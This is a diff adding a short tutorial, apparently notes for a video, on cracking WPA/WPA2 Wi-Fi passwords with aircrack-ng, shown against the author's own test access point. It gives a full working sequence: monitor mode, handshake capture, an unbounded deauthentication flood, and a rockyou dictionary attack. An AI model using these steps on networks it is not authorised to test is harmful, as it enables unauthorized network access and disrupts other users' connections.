@@ -1,0 +1,111 @@
+			STEPS to crack wifi wpa/wpa2 using aircrack-ng
+			
+			THE AP I CREATED NAME "10" AND ITS PASSWORD IS "hellohello"
+			
+	In this tutorior we gonna use rockyou wordlists to crack
+	
+	!Go to the directory have rockyou
+	cd /usr/share/wordlists 
+	
+	!ls to see it
+	
+	!We have to unzip it to use
+	sudo gzip -d rockyou.txt.gz
+	
+	!ls to check
+	
+	NOW WE CAN USE IT
+	
+		
+	
+	! See interfaces
+	ip addr / iw config
+	
+	!check kill
+	sudo airmon-ng check kill
+	(there are fews process may block us from cracking wifi so be sure to kill them)
+	
+	
+	!Into monitormode
+	sudo airmon-ng start wlan0	: this is the correct one
+	
+	
+	!Verify that monitor mode is used
+	sudo airmon-ng
+	
+		
+	!You could also use iwconfig to check that interface is in monitor mode:
+	iwconfig
+	
+	
+	! Get the AP's MAC address and channel which you want to crack 
+	sudo airodump-ng wlan0mon
+	
+	
+	
+	
+	
+	(Write out BSSID and channel)
+	
+	BSSID : FA:F1:E6:D0:0F:E5
+	CHANNEL : 6
+	
+	
+	! lock wifi card on the same channel with AP
+	iw config wlan0mon channel <channel>
+	
+	
+	!capture handshake with this command
+	airodump-ng -w <filename> -c <channel> --bssid <bssid> wlan0mon
+	filename : is the file we create to save information which we captured
+	
+	
+	
+	
+	!Deathenticate to capture the handshake between client and AP
+	aireplay-ng --deauth 0 -a <bssid> wlan0mon
+	0 : deauth until we cancel it
+	
+	
+	Ctrl+C : to stop the process
+	
+	
+	!When we captured , using ls to see the file 
+	ls
+	
+	"we can see hack1-01.cap is the captured file which we have while doing all the 	above command"
+	
+	!Use Wireshark to open hack file
+	wireshark <filename.cap>
+	
+	!Filter Wireshark messages for EAPOL
+	eapol
+	
+	"WE CAN SEE IT IS 4-WAY-HAND-SHAKE CAPTURED"
+	"WPA KEY ID : is the password which is encrypted and now we have to decrypt to see 		the password "
+	
+	
+	
+	!Stop monitor mode 
+	airmon-ng stop wlan0mon
+	
+	
+	!Crack file with rockyou wordlists
+	aircrack-ng <filename.cap> -w /usr/share/wordlists/rockyou.txt
+		    "hack1-01.cap"
+		    
+		    KEY FOUND! [ hellohello ]
+		WE can found the password which i set for my ap
+		
+		THE only problem with this kind of using aircrack is
+		only the password which rockyou.txt have that we can crack it
+		otherwise it wont crack
+		THANK YOU FOR WATCHING THE VIDEO !!!!!!!!
+	
+	
+	
+	
+	
+
+	
+	
